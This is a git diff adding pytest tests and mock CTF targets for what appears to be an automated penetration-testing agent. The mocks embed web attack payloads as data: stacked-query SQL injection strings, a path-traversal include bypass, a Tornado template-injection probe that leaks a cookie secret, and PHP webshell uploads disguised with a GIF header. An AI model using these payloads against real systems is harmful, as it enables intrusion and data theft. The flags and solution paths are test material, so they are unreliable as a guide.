@@ -1,7 +1,9 @@
 from __future__ import annotations
 
 import asyncio
+import hashlib
 from types import SimpleNamespace
+from urllib.parse import parse_qs, urlparse
 
 import pytest
 
@@ -9,6 +11,7 @@ from pentestagent.agents.pa_agent.ctf_dispatcher import (
     CTFTaskDispatcher,
     _normalize_contact_captcha_text,
     _normalize_exploration_url,
+    _quote_sql_identifier,
     _solve_contact_pow_solution,
 )
 from pentestagent.agents.pa_agent.capability_registry import CapabilityEntry
@@ -338,6 +341,124 @@ class _DispatcherProxyFallbackSQLiRuntime:
         return SimpleNamespace(exit_code=0, stdout="", stderr="")
 
 
+class _DispatcherGenericInjectSQLiRuntime:
+    def __init__(self):
+        self.environment = SimpleNamespace(available_tools=[])
+        self.requests: list[str] = []
+
+    async def browser_action(self, action: str, **kwargs):
+        if action == "navigate":
+            return {"url": "http://ctf.local/", "title": "easy_sql"}
+        if action == "get_content":
+            return {
+                "content": "easy_sql 姿势 inject",
+                "html": """
+                <html><body>
+                  <form action="http://ctf.local/" method="get">
+                    <input name="inject" type="text" value="1" />
+                  </form>
+                </body></html>
+                """,
+            }
+        if action == "get_forms":
+            return {
+                "forms": [
+                    {
+                        "action": "http://ctf.local/",
+                        "method": "get",
+                        "inputs": [
+                            {"name": "inject", "type": "text", "value": "1"},
+                        ],
+                    }
+                ]
+            }
+        if action == "get_cookies":
+            return {"cookie_string": ""}
+        return {"error": f"unexpected action: {action}"}
+
+    async def proxy_action(self, action: str, **kwargs):
+        if action == "request":
+            url = str(kwargs.get("url") or "")
+            self.requests.append(url)
+            inject_value = (parse_qs(urlparse(url).query).get("inject") or [""])[0]
+            if inject_value == "1":
+                return {"status_code": 200, "body": 'array(2) { [0]=> string(1) "1" [1]=> string(8) "hahahah" }'}
+            if inject_value == "1'":
+                return {"status_code": 200, "body": "You have an error in your SQL syntax; check the MariaDB server version"}
+            if inject_value == "1';show tables;#":
+                return {
+                    "status_code": 200,
+                    "body": (
+                        'array(4) { [0]=> string(1) "1" [1]=> string(8) "hahahah" '
+                        '[2]=> string(16) "1919810931114514" [3]=> string(5) "words" }'
+                    ),
+                }
+            if inject_value == "1';show columns from `1919810931114514`;#":
+                return {
+                    "status_code": 200,
+                    "body": (
+                        'array(3) { [0]=> string(2) "id" [1]=> string(4) "data" '
+                        '[2]=> string(4) "flag" }'
+                    ),
+                }
+            if inject_value == "1';handler `1919810931114514` open;handler `1919810931114514` read first;#":
+                return {
+                    "status_code": 200,
+                    "body": 'array(1) { [0]=> string(44) "DASCTF{07423849-4854-4b8e-99a3-90d6b83ede12}" }',
+                }
+        return {"status_code": 200, "body": ""}
+
+    async def execute_command(self, command: str, timeout: int = 180):
+        return SimpleNamespace(exit_code=0, stdout="", stderr="")
+
+
+class _DispatcherWarmupIncludeRuntime:
+    def __init__(self):
+        self.environment = SimpleNamespace(available_tools=[])
+        self.requests: list[str] = []
+
+    async def browser_action(self, action: str, **kwargs):
+        return {"error": "rendered browser intentionally unavailable"}
+
+    async def proxy_action(self, action: str, **kwargs):
+        url = str(kwargs.get("url") or "")
+        self.requests.append(url)
+        if action != "get":
+            return {"status_code": 404, "body": ""}
+        if url.rstrip("/") == "http://ctf.local":
+            return {
+                "status_code": 200,
+                "body": '<html><body><!--source.php--><img src="https://example.invalid/a.jpg"></body></html>',
+            }
+        if url == "http://ctf.local/source.php":
+            return {
+                "status_code": 200,
+                "body": """
+                <code>&lt;?php
+                highlight_file(__FILE__);
+                class emmm {
+                    public static function checkFile(&$page) {
+                        $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
+                        $_page = mb_substr($page, 0, mb_strpos($page . '?', '?'));
+                        $_page = urldecode($page);
+                    }
+                }
+                if (!empty($_REQUEST['file']) && emmm::checkFile($_REQUEST['file'])) {
+                    include $_REQUEST['file'];
+                }
+                ?&gt;</code>
+                """,
+            }
+        if url == "http://ctf.local/hint.php":
+            return {"status_code": 200, "body": "flag not here, and flag in ffffllllaaaagggg"}
+        if "file=source.php%3F../../../../../ffffllllaaaagggg" in url:
+            return {"status_code": 200, "body": "DASCTF{warmup_include_bypass_ok}"}
+        return {"status_code": 404, "body": ""}
+
+    async def execute_command(self, command: str, timeout: int = 180):
+        return SimpleNamespace(exit_code=0, stdout="", stderr="")
+
+
 class _DispatcherMissingReconDepsRuntime:
     def __init__(self):
         self.environment = SimpleNamespace(available_tools=[])
@@ -459,6 +580,104 @@ class _DispatcherPostAuthBootstrapRuntime:
                 "redirect_history": [],
             }
         return {"status_code": 404, "body": ""}
+
+    async def execute_command(self, command: str, timeout: int = 180):
+        return SimpleNamespace(exit_code=0, stdout="", stderr="")
+
+
+class _DispatcherPostAuthUploadBootstrapRuntime:
+    def __init__(self):
+        self.environment = SimpleNamespace(available_tools=[])
+        self.proxy_calls: list[tuple[str, str, str | None, dict, dict]] = []
+        self.registered_email = ""
+        self.logged_in = False
+
+    async def browser_action(self, action: str, **kwargs):
+        return {"error": "browser unavailable"}
+
+    async def proxy_action(self, action: str, **kwargs):
+        url = kwargs.get("url", "")
+        method = kwargs.get("method")
+        data = dict(kwargs.get("data") or {}) if isinstance(kwargs.get("data"), dict) else {}
+        files = dict(kwargs.get("files") or {}) if isinstance(kwargs.get("files"), dict) else {}
+        self.proxy_calls.append((action, url, method, data, files))
+
+        if action == "get" and url.rstrip("/") == "http://ctf.local":
+            if self.logged_in:
+                return {
+                    "status_code": 200,
+                    "final_url": "http://ctf.local/index.php/home",
+                    "body": """
+                    <html><head><title>Discuz Zone</title></head><body>
+                      <p>Please upload your img:</p>
+                      <form action="upload" method="POST" enctype="multipart/form-data">
+                        <input name="upload_file" type="file" />
+                        <input type="submit" value="Upload" />
+                      </form>
+                    </body></html>
+                    """,
+                    "headers": {},
+                    "redirect_history": [],
+                }
+            return {
+                "status_code": 200,
+                "final_url": "http://ctf.local/",
+                "body": """
+                <html><head><title>Discuz Zone</title></head><body>
+                  <form action="login" method="post">
+                    <input name="email" type="text" />
+                    <input name="password" type="password" />
+                  </form>
+                  <form action="register" method="post">
+                    <input name="username" type="text" />
+                    <input name="email" type="text" />
+                    <input name="password" type="password" />
+                  </form>
+                </body></html>
+                """,
+                "headers": {},
+                "redirect_history": [],
+            }
+
+        if action == "request" and method == "POST" and url == "http://ctf.local/register":
+            email = str(data.get("email") or "")
+            if email.endswith("@example.com"):
+                self.registered_email = email
+                return {"status_code": 200, "final_url": url, "body": "Registed successful!"}
+            return {"status_code": 200, "final_url": url, "body": "Email illegal!"}
+
+        if action == "request" and method == "POST" and url == "http://ctf.local/login":
+            if data.get("email") == self.registered_email and data.get("password"):
+                self.logged_in = True
+                return {
+                    "status_code": 200,
+                    "final_url": "http://ctf.local/",
+                    "body": "Login successful!",
+                    "headers": {"set-cookie": "user=demo; Path=/"},
+                    "redirect_history": [],
+                }
+            return {"status_code": 200, "final_url": url, "body": "email not registed!"}
+
+        if action == "get" and url == "http://ctf.local/index.php/home":
+            return await self.proxy_action("get", url="http://ctf.local/")
+
+        if action == "request" and method == "POST" and url.endswith("/upload"):
+            uploaded = files.get("upload_file") if isinstance(files.get("upload_file"), dict) else {}
+            filename = str(uploaded.get("filename") or "flaghunter_probe.txt")
+            return {
+                "status_code": 200,
+                "final_url": "http://ctf.local/upload",
+                "body": f'uploaded: <a href="/upload/{filename}">{filename}</a>',
+            }
+
+        if action == "get" and url == "http://ctf.local/upload/flaghunter.php":
+            return {
+                "status_code": 200,
+                "final_url": url,
+                "body": "DASCTF{post-auth-upload-chain-ok}",
+            }
+
+        return {"status_code": 404, "final_url": url, "body": "not found"}
 
     async def execute_command(self, command: str, timeout: int = 180):
         return SimpleNamespace(exit_code=0, stdout="", stderr="")
@@ -593,6 +812,77 @@ class _DispatcherRenderSurfaceDedupeRuntime:
         return SimpleNamespace(exit_code=0, stdout="", stderr="")
 
 
+class _DispatcherEasyTornadoRuntime:
+    COOKIE_SECRET = "4f3b7a86-5db4-43ac-bfa6-b10f4e12f32b"
+    FLAG = "DASCTF{easy_tornado_handler_settings_ok}"
+
+    def __init__(self):
+        self.environment = SimpleNamespace(available_tools=[])
+        self.requests: list[str] = []
+
+    async def browser_action(self, action: str, **kwargs):
+        return {"error": "rendered browser intentionally unavailable"}
+
+    def _filehash(self, filename: str) -> str:
+        inner = hashlib.md5(filename.encode()).hexdigest()
+        return hashlib.md5((self.COOKIE_SECRET + inner).encode()).hexdigest()
+
+    async def proxy_action(self, action: str, **kwargs):
+        if action != "get":
+            return {"status_code": 404, "body": ""}
+        url = str(kwargs.get("url") or "")
+        self.requests.append(url)
+
+        if url.rstrip("/") == "http://ctf.local":
+            return {
+                "status_code": 200,
+                "body": """
+                <a href="/file?filename=/flag.txt&filehash=8f3944a6ff9c64f0678830d398ff5d9f">/flag.txt</a>
+                <a href="/file?filename=/welcome.txt&filehash=3903afbae91b30f47e35c2610cd760f2">/welcome.txt</a>
+                <a href="/file?filename=/hints.txt&filehash=5401895f8dae905216d71a39140ec036">/hints.txt</a>
+                """,
+            }
+
+        parsed = urlparse(url)
+        params = parse_qs(parsed.query)
+        filename = (params.get("filename") or [""])[0]
+        filehash = (params.get("filehash") or [""])[0]
+        if parsed.path == "/file" and filename == "/welcome.txt":
+            return {"status_code": 200, "body": "/welcome.txt<br>render"}
+        if parsed.path == "/file" and filename == "/hints.txt":
+            return {"status_code": 200, "body": "/hints.txt<br>md5(cookie_secret+md5(filename))"}
+        if parsed.path == "/file" and filename == "/flag.txt":
+            return {"status_code": 200, "body": "/flag.txt<br>flag in /fllllllllllllag"}
+        if parsed.path == "/file" and filename == "/fllllllllllllag" and filehash == self._filehash(filename):
+            return {"status_code": 200, "body": f"/fllllllllllllag<br>{self.FLAG}"}
+        if parsed.path == "/file" and filename:
+            return {
+                "status_code": 200,
+                "body": "ORZ",
+                "final_url": "http://ctf.local/error?msg=Error",
+                "redirect_history": [{"status_code": 302, "url": url, "location": "/error?msg=Error"}],
+            }
+
+        msg = (params.get("msg") or [""])[0]
+        if parsed.path == "/error" and msg == "{{handler.settings}}":
+            return {
+                "status_code": 200,
+                "body": (
+                    "<html><body>{'autoreload': True, 'compiled_template_cache': False, "
+                    f"'cookie_secret': '{self.COOKIE_SECRET}'}}</body></html>"
+                ),
+                "final_url": url,
+                "redirect_history": [],
+            }
+        if parsed.path == "/error":
+            return {"status_code": 200, "body": "ORZ", "final_url": url, "redirect_history": []}
+
+        return {"status_code": 404, "body": ""}
+
+    async def execute_command(self, command: str, timeout: int = 180):
+        return SimpleNamespace(exit_code=0, stdout="", stderr="")
+
+
 class _DispatcherStaticSourceLeakRuntime:
     def __init__(self):
         self.environment = SimpleNamespace(available_tools=[])
@@ -679,6 +969,130 @@ class _DispatcherUnicodeNumericRuntime:
             if str(data.get("price")) in {"萬", "፼", "ↈ"}:
                 return {"status_code": 200, "body": "still testing"}
         return {"status_code": 200, "body": "Only one char allowed!"}
+
+    async def execute_command(self, command: str, timeout: int = 180):
+        return SimpleNamespace(exit_code=0, stdout="", stderr="")
+
+
+class _DispatcherBackupHtmlRuntime:
+    def __init__(self):
+        self.environment = SimpleNamespace(available_tools=[])
+        self.requests: list[str] = []
+
+    async def proxy_action(self, action: str, **kwargs):
+        url = kwargs.get("url", "")
+        self.requests.append(url)
+        return {
+            "status_code": 200,
+            "headers": {"content-type": "text/html; charset=utf-8"},
+            "body": """
+            <html><body>
+              <title>URL Storage - Signup/Login</title>
+              <input type="submit" class="button" value="Login / Register">
+            </body></html>
+            """,
+        }
+
+    async def browser_action(self, action: str, **kwargs):
+        return {"error": "browser unavailable"}
+
+    async def execute_command(self, command: str, timeout: int = 180):
+        return SimpleNamespace(exit_code=0, stdout="", stderr="")
+
+
+class _DispatcherGenericUploadRuntime:
+    def __init__(self):
+        self.environment = SimpleNamespace(available_tools=[])
+        self.requests: list[tuple[str, str, str | None, dict, dict]] = []
+
+    async def proxy_action(self, action: str, **kwargs):
+        url = kwargs.get("url", "")
+        method = kwargs.get("method")
+        data = dict(kwargs.get("data") or {}) if isinstance(kwargs.get("data"), dict) else {}
+        files = dict(kwargs.get("files") or {}) if isinstance(kwargs.get("files"), dict) else {}
+        self.requests.append((action, url, method, data, files))
+
+        if action == "get" and url == "http://ctf.local/":
+            return {
+                "status_code": 200,
+                "final_url": "http://ctf.local/",
+                "body": """
+                <html><body>
+                  <form action="/upload" method="post" enctype="multipart/form-data">
+                    <input type="hidden" name="token" value="csrf-demo">
+                    <input type="text" name="title">
+                    <input type="file" name="file">
+                    <button>Upload</button>
+                  </form>
+                </body></html>
+                """,
+            }
+
+        if action == "request" and method == "POST" and url == "http://ctf.local/upload":
+            uploaded = files.get("file") if isinstance(files.get("file"), dict) else {}
+            filename = str(uploaded.get("filename") or "flaghunter_probe.txt")
+            return {
+                "status_code": 200,
+                "final_url": "http://ctf.local/upload",
+                "body": f'uploaded: <a href="/uploads/{filename}">{filename}</a>',
+            }
+
+        if action == "get" and url == "http://ctf.local/uploads/flaghunter.php":
+            return {
+                "status_code": 200,
+                "final_url": url,
+                "body": "DASCTF{generic-upload-chain-ok}",
+            }
+
+        return {"status_code": 404, "final_url": url, "body": "not found"}
+
+    async def browser_action(self, action: str, **kwargs):
+        return {"error": "browser unavailable"}
+
+    async def execute_command(self, command: str, timeout: int = 180):
+        return SimpleNamespace(exit_code=0, stdout="", stderr="")
+
+
+class _DispatcherPhpUploadCookiePopRuntime:
+    def __init__(self):
+        self.environment = SimpleNamespace(available_tools=[])
+        self.calls: list[tuple[str, str, str | None, dict, dict, dict]] = []
+        self.logged_in = False
+        self.image_path = "../upload/abc123/uploaded.png"
+
+    async def proxy_action(self, action: str, **kwargs):
+        url = kwargs.get("url", "")
+        method = kwargs.get("method")
+        data = dict(kwargs.get("data") or {}) if isinstance(kwargs.get("data"), dict) else {}
+        files = dict(kwargs.get("files") or {}) if isinstance(kwargs.get("files"), dict) else {}
+        headers = dict(kwargs.get("headers") or {}) if isinstance(kwargs.get("headers"), dict) else {}
+        self.calls.append((action, url, method, data, files, headers))
+
+        if action == "request" and method == "POST" and url == "http://ctf.local/register":
+            return {"status_code": 200, "final_url": url, "body": "Registed successful!"}
+        if action == "request" and method == "POST" and url == "http://ctf.local/login":
+            self.logged_in = True
+            return {"status_code": 200, "final_url": url, "body": "Login successful!", "headers": {"set-cookie": "user=demo"}}
+        if action == "request" and method == "POST" and url == "http://ctf.local/index.php/upload":
+            assert self.logged_in is True
+            uploaded = files.get("upload_file") if isinstance(files.get("upload_file"), dict) else {}
+            assert str(uploaded.get("content") or "").startswith("GIF89a<?php")
+            return {"status_code": 200, "final_url": url, "body": "Upload img successful!"}
+        if action == "get" and url == "http://ctf.local/home":
+            return {
+                "status_code": 200,
+                "final_url": url,
+                "body": f'<html><body><img src="{self.image_path}"></body></html>',
+            }
+        if action == "request" and method == "GET" and url == "http://ctf.local/home":
+            assert "Cookie" in headers and "user=" in headers["Cookie"]
+            return {"status_code": 500, "final_url": url, "body": "triggered"}
+        if action == "get" and url == "http://ctf.local/upload/abc123/flaghunter_shell.php":
+            return {"status_code": 200, "final_url": url, "body": "GIF89aDASCTF{php-upload-cookie-pop-ok}"}
+        return {"status_code": 404, "final_url": url, "body": "not found"}
+
+    async def browser_action(self, action: str, **kwargs):
+        return {"error": "browser unavailable"}
 
     async def execute_command(self, command: str, timeout: int = 180):
         return SimpleNamespace(exit_code=0, stdout="", stderr="")
@@ -2761,6 +3175,61 @@ def test_recent_local_profile_photo_poisoning_source_exploit_derives_exploit_inf
 
 
 @pytest.mark.asyncio
+async def test_profile_photo_poisoning_returns_runtime_flag(monkeypatch, tmp_path):
+    monkeypatch.setattr(
+        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
+        lambda self, tools: {},
+    )
+    set_notes_file(tmp_path / "notes_profile_photo_runtime_flag.json")
+    notes_module._notes.clear()
+
+    flag = "DASCTF{profile_photo_runtime_ok}"
+
+    class _ProfilePhotoRuntime:
+        def __init__(self):
+            self.environment = SimpleNamespace(available_tools=[])
+
+        async def browser_action(self, action: str, **kwargs):
+            return {"error": "no browser"}
+
+        async def proxy_action(self, action: str, **kwargs):
+            url = str(kwargs.get("url") or "")
+            if action == "request" and kwargs.get("method") == "GET" and url.endswith("/profile.php"):
+                encoded = "PD9waHAgJGNvbmZpZ1snZmxhZyddID0gJ0RBU0NURntwcm9maWxlX3Bob3RvX3J1bnRpbWVfb2t9JzsgPz4="
+                return {"status_code": 200, "body": f'<img src="data:image/png;base64,{encoded}">'}
+            if action == "request":
+                return {"status_code": 200, "body": "ok"}
+            return {"status_code": 404, "body": ""}
+
+        async def execute_command(self, command: str, timeout: int = 180):
+            return SimpleNamespace(exit_code=0, stdout="", stderr="")
+
+    dispatcher = CTFTaskDispatcher(
+        runtime=_ProfilePhotoRuntime(),
+        progress_callback=None,
+        verification_callback=None,
+    )
+    dispatcher.state = CTFState(target="http://ctf.local", goal="拿到flag", detected_type="web")
+
+    outcome = await dispatcher._attempt_profile_photo_poisoning_chain(
+        "http://ctf.local/",
+        {
+            "register_path": "/register.php",
+            "login_path": "/index.php",
+            "update_path": "/update.php",
+            "profile_path": "/profile.php",
+        },
+        artifact_url="http://ctf.local/www.zip",
+    )
+
+    assert outcome.progress is True
+    assert outcome.flag == flag
+    notes_module._notes.clear()
+    notes_module._custom_notes_file = None
+    notes_module._loaded_notes_file = None
+
+
+@pytest.mark.asyncio
 async def test_execute_web_chain_runs_profile_photo_poisoning_before_backup_when_source_hints_exist(
     monkeypatch,
 ):
@@ -3167,6 +3636,223 @@ async def test_ctf_dispatcher_solves_auth_form_sqli(monkeypatch, tmp_path):
 
 
 @pytest.mark.asyncio
+async def test_ctf_dispatcher_auto_primes_capabilities_for_generic_get_sqli(monkeypatch, tmp_path):
+    monkeypatch.setattr(
+        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
+        lambda self, tools: {},
+    )
+    set_notes_file(tmp_path / "notes_generic_get_sqli.json")
+    notes_module._notes.clear()
+
+    runtime = _DispatcherGenericInjectSQLiRuntime()
+    dispatcher = CTFTaskDispatcher(
+        runtime=runtime,
+        progress_callback=None,
+        verification_callback=lambda flag: "yes",
+    )
+
+    full_check_called = {"value": False}
+
+    async def _fake_full_check(self):
+        full_check_called["value"] = True
+        primitive = self.get("sql_injection_test")
+        assert primitive is not None
+        for implementation in primitive.implementations:
+            implementation.available = implementation.method == "sqlmap"
+        self.capability_table["sqlmap"] = CapabilityEntry(
+            tool_name="sqlmap",
+            is_available=True,
+            health_state="healthy",
+            last_check_ts=0.0,
+            fallback_tool="manual_sqli_payload",
+            install_command=None,
+            requires_user_confirm=False,
+        )
+        return self
+
+    observed_sqlmap_call: dict[str, object] = {}
+
+    async def _fake_run_sqlmap(*, url, data, level, risk, runtime):
+        observed_sqlmap_call.update(
+            {"url": url, "data": data, "level": level, "risk": risk, "runtime": runtime}
+        )
+        return {
+            "vulnerable": True,
+            "injection_points": [{"parameter": "inject", "type": "GET"}],
+            "databases": ["ctf"],
+            "raw": "flag{dispatcher_generic_get_sqli_ok}",
+        }
+
+    monkeypatch.setattr(
+        "pentestagent.agents.pa_agent.capability_registry.CapabilityRegistry.full_check",
+        _fake_full_check,
+    )
+    monkeypatch.setattr("pentestagent.tools.sqlmap.run_sqlmap", _fake_run_sqlmap)
+
+    result = await dispatcher.run(
+        target="http://ctf.local/",
+        goal="拿到flag",
+        type="auto",
+        hint="",
+    )
+
+    assert full_check_called["value"] is True
+    assert result.success is True
+    assert result.flag == "flag{dispatcher_generic_get_sqli_ok}"
+    assert dispatcher.state is not None
+    assert dispatcher.state.detected_type == "sqli"
+    assert observed_sqlmap_call["url"] == "http://ctf.local/?inject=test"
+    assert observed_sqlmap_call["data"] == ""
+    notes_module._notes.clear()
+    notes_module._custom_notes_file = None
+    notes_module._loaded_notes_file = None
+
+
+@pytest.mark.asyncio
+async def test_ctf_dispatcher_falls_back_to_stacked_query_generic_get_sqli(monkeypatch, tmp_path):
+    monkeypatch.setattr(
+        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
+        lambda self, tools: {},
+    )
+    set_notes_file(tmp_path / "notes_generic_get_stacked_sqli.json")
+    notes_module._notes.clear()
+
+    runtime = _DispatcherGenericInjectSQLiRuntime()
+    dispatcher = CTFTaskDispatcher(
+        runtime=runtime,
+        progress_callback=None,
+        verification_callback=lambda flag: "yes",
+    )
+
+    async def _fake_full_check(self):
+        primitive = self.get("sql_injection_test")
+        assert primitive is not None
+        for implementation in primitive.implementations:
+            implementation.available = implementation.method == "sqlmap"
+        self.capability_table["sqlmap"] = CapabilityEntry(
+            tool_name="sqlmap",
+            is_available=True,
+            health_state="healthy",
+            last_check_ts=0.0,
+            fallback_tool="manual_sqli_payload",
+            install_command=None,
+            requires_user_confirm=False,
+        )
+        return self
+
+    async def _fake_run_sqlmap(*, url, data, level, risk, runtime):
+        return {
+            "vulnerable": True,
+            "injection_points": [{"parameter": "inject", "type": "GET"}],
+            "databases": ["ctf"],
+            "raw": "sqlmap identified injectable GET parameter but no flag yet",
+        }
+
+    monkeypatch.setattr(
+        "pentestagent.agents.pa_agent.capability_registry.CapabilityRegistry.full_check",
+        _fake_full_check,
+    )
+    monkeypatch.setattr("pentestagent.tools.sqlmap.run_sqlmap", _fake_run_sqlmap)
+
+    result = await dispatcher.run(
+        target="http://ctf.local/",
+        goal="拿到flag",
+        type="auto",
+        hint="",
+    )
+
+    assert result.success is True
+    assert result.flag == "DASCTF{07423849-4854-4b8e-99a3-90d6b83ede12}"
+    assert "sqli" in result.chain_used
+    assert dispatcher.state is not None
+    assert dispatcher.state.detected_type == "sqli"
+    assert any("show+tables" in request for request in runtime.requests)
+    assert any("handler+" in request for request in runtime.requests)
+    notes_module._notes.clear()
+    notes_module._custom_notes_file = None
+    notes_module._loaded_notes_file = None
+
+
+@pytest.mark.asyncio
+async def test_ctf_dispatcher_uses_stacked_query_fallback_without_sqlmap(monkeypatch, tmp_path):
+    monkeypatch.setattr(
+        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
+        lambda self, tools: {},
+    )
+    set_notes_file(tmp_path / "notes_generic_get_no_sqlmap.json")
+    notes_module._notes.clear()
+
+    runtime = _DispatcherGenericInjectSQLiRuntime()
+    dispatcher = CTFTaskDispatcher(
+        runtime=runtime,
+        progress_callback=None,
+        verification_callback=lambda flag: "yes",
+    )
+
+    async def _fake_full_check(self):
+        primitive = self.get("sql_injection_test")
+        assert primitive is not None
+        for implementation in primitive.implementations:
+            implementation.available = implementation.method == "manual_payload_via_requests"
+        self.capability_table["http_request"] = CapabilityEntry(
+            tool_name="http_request",
+            is_available=True,
+            health_state="healthy",
+            last_check_ts=0.0,
+            fallback_tool=None,
+            install_command=None,
+            requires_user_confirm=False,
+        )
+        return self
+
+    async def _unexpected_run_sqlmap(**kwargs):
+        raise AssertionError("sqlmap should not be called when only manual_payload_via_requests is available")
+
+    monkeypatch.setattr(
+        "pentestagent.agents.pa_agent.capability_registry.CapabilityRegistry.full_check",
+        _fake_full_check,
+    )
+    monkeypatch.setattr("pentestagent.tools.sqlmap.run_sqlmap", _unexpected_run_sqlmap)
+
+    result = await dispatcher.run(
+        target="http://ctf.local/",
+        goal="拿到flag",
+        type="auto",
+        hint="",
+    )
+
+    assert result.success is True
+    assert result.flag == "DASCTF{07423849-4854-4b8e-99a3-90d6b83ede12}"
+    assert "sqli" in result.chain_used
+    assert dispatcher.state is not None
+    assert dispatcher.state.detected_type == "sqli"
+    assert any("show+tables" in request for request in runtime.requests)
+    assert not any("inject=test" in request for request in runtime.requests)
+    notes_module._notes.clear()
+    notes_module._custom_notes_file = None
+    notes_module._loaded_notes_file = None
+
+
+def test_ctf_dispatcher_extracts_php_var_dump_strings_for_stacked_sqli():
+    dispatcher = CTFTaskDispatcher(runtime=None)
+    body = (
+        'array(3) { [0]=> string(16) "1919810931114514" '
+        '[1]=> string(5) "words" [2]=> string(4) "flag" }'
+    )
+
+    assert dispatcher._extract_php_var_dump_strings(body) == [
+        "1919810931114514",
+        "words",
+        "flag",
+    ]
+
+
+def test_quote_sql_identifier_escapes_backticks_for_stacked_sqli():
+    assert _quote_sql_identifier("1919810931114514") == "`1919810931114514`"
+    assert _quote_sql_identifier("we`ird") == "`we``ird`"
+
+
+@pytest.mark.asyncio
 async def test_ctf_dispatcher_solves_unicode_numeric_form_bypass(monkeypatch, tmp_path):
     monkeypatch.setattr(
         "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
@@ -3299,16 +3985,24 @@ async def test_ctf_dispatcher_does_not_repeat_same_render_surface_after_exhausti
         and item.metadata.get("strategy_kind") == "ssti_probe"
         for item in dispatcher.state.observations
     )
+    assert any(
+        item.kind == "strategy_surface_exhausted"
+        and item.metadata.get("strategy_kind") == "hash_guarded_file_read"
+        for item in dispatcher.state.observations
+    )
     assert dispatcher.state.stop_report is not None
     assert dispatcher.state.stop_report["reason"] == "blocked_surface_exhausted"
 
     # Phase 7: ssti_identify 只有在 ssti_probe 命中 "49" 后才会运行。
-    # 该 mock surface 始终返回统一的 ORZ，因此只应看到 ssti_probe 的一次 {{7*7}} 请求，
-    # 随后 surface 被标记 exhausted，而不是再进入 identify 阶段。
+    # 该 mock surface 始终返回统一的 ORZ，因此 hash_guarded 只允许一组
+    # handler.settings 定向探针，ssti_probe 只允许一次 {{7*7}} 请求；
+    # 随后 surface 被标记 exhausted，而不是跨 recovery 重复同一表面。
     render_probe_requests = [
         item for item in runtime.requests if "/error?msg=%7B%7B" in item
     ]
-    assert len(render_probe_requests) == 1
+    assert len(render_probe_requests) == 4
+    assert sum("%7B%7B7%2A7%7D%7D" in item for item in render_probe_requests) == 1
+    assert sum("handler.settings%7D%7D" in item for item in render_probe_requests) == 1
     notes_module._notes.clear()
     notes_module._custom_notes_file = None
     notes_module._loaded_notes_file = None
@@ -3411,6 +4105,92 @@ async def test_ctf_dispatcher_phase_recon_bootstraps_post_auth_surface():
     assert any("flag?token=" in link for link in features["raw_links"])
     assert "/urlstorage" in features["url"]
     assert find_auth_form(features["forms"]) is None
+
+
+@pytest.mark.asyncio
+async def test_ctf_dispatcher_auto_registers_then_solves_post_auth_upload(monkeypatch, tmp_path):
+    monkeypatch.setattr(
+        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
+        lambda self, tools: {},
+    )
+    set_notes_file(tmp_path / "notes_post_auth_upload.json")
+    notes_module._notes.clear()
+
+    runtime = _DispatcherPostAuthUploadBootstrapRuntime()
+    dispatcher = CTFTaskDispatcher(runtime=runtime, progress_callback=None)
+
+    async def _skip_capability_check(self):
+        return self
+
+    monkeypatch.setattr(
+        "pentestagent.agents.pa_agent.capability_registry.CapabilityRegistry.full_check",
+        _skip_capability_check,
+    )
+
+    result = await dispatcher.run(
+        target="http://ctf.local/",
+        goal="拿到flag",
+        type="auto",
+        hint="需要先注册登录，再寻找上传表单。",
+    )
+
+    assert result.success is True
+    assert result.flag == "DASCTF{post-auth-upload-chain-ok}"
+    assert dispatcher.state is not None
+    assert dispatcher.state.detected_type == "upload"
+    assert "upload" in result.chain_used
+    register_calls = [
+        item for item in runtime.proxy_calls
+        if item[0] == "request" and item[1] == "http://ctf.local/register"
+    ]
+    login_calls = [
+        item for item in runtime.proxy_calls
+        if item[0] == "request" and item[1] == "http://ctf.local/login"
+    ]
+    upload_calls = [
+        item for item in runtime.proxy_calls
+        if item[0] == "request" and item[1].endswith("/upload")
+    ]
+    assert register_calls
+    assert register_calls[0][3]["email"].endswith("@example.com")
+    assert login_calls
+    assert upload_calls
+    notes_module._notes.clear()
+    notes_module._custom_notes_file = None
+    notes_module._loaded_notes_file = None
+
+
+@pytest.mark.asyncio
+async def test_recoverable_source_only_wrong_flag_does_not_early_stop():
+    dispatcher = CTFTaskDispatcher(runtime=None, progress_callback=None)
+    dispatcher.state = CTFState(target="http://ctf.local/", goal="拿到flag", detected_type="upload")
+    dispatcher._pending_wrong_flag_feedback = [
+        {
+            "flag": "literal{$count}",
+            "rationale": "source-only placeholder candidate",
+            "evidence_source": "source-only",
+            "recoverable": "true",
+        }
+    ]
+    result = SimpleNamespace(notes=[], reason="")
+    outcome = SimpleNamespace(flag=None, progress=True)
+
+    final = await dispatcher.coordinator._apply_wrong_flag_early_stop_contract(
+        dispatcher,
+        result=result,
+        outcome=outcome,
+        target="http://ctf.local/",
+        chain_name="upload",
+    )
+
+    assert final is None
+    assert dispatcher._pending_wrong_flag_feedback == []
+    assert result.reason == ""
+    assert any(
+        item.get("type") == "recoverable_wrong_flag_continued"
+        and item.get("flag") == "literal{$count}"
+        for item in dispatcher.state.meta_reasonings
+    )
 
 
 @pytest.mark.asyncio
@@ -3818,6 +4598,128 @@ def test_ctf_dispatcher_collect_candidate_filenames_extracts_sentence_style_path
     assert "/flag.final" in candidates
 
 
+def test_ctf_dispatcher_extracts_comment_source_links_for_warmup():
+    dispatcher = CTFTaskDispatcher(runtime=_DispatcherMissingReconDepsRuntime(), progress_callback=None)
+
+    links = dispatcher._extract_embedded_links(
+        '<html><body><!--source.php--><a href="/visible">visible</a></body></html>',
+        "http://ctf.local/",
+    )
+
+    assert "http://ctf.local/source.php" in links
+
+
+def test_ctf_dispatcher_extracts_warmup_flag_filename_hint():
+    dispatcher = CTFTaskDispatcher(runtime=_DispatcherMissingReconDepsRuntime(), progress_callback=None)
+
+    assert dispatcher._extract_warmup_flag_filenames(
+        "flag not here, and flag in ffffllllaaaagggg"
+    ) == ["ffffllllaaaagggg"]
+
+
+@pytest.mark.asyncio
+async def test_ctf_dispatcher_solves_warmup_comment_source_include_bypass(monkeypatch, tmp_path):
+    monkeypatch.setattr(
+        "pentestagent.agents.pa_agent.ctf_dispatcher.ToolGuard.require",
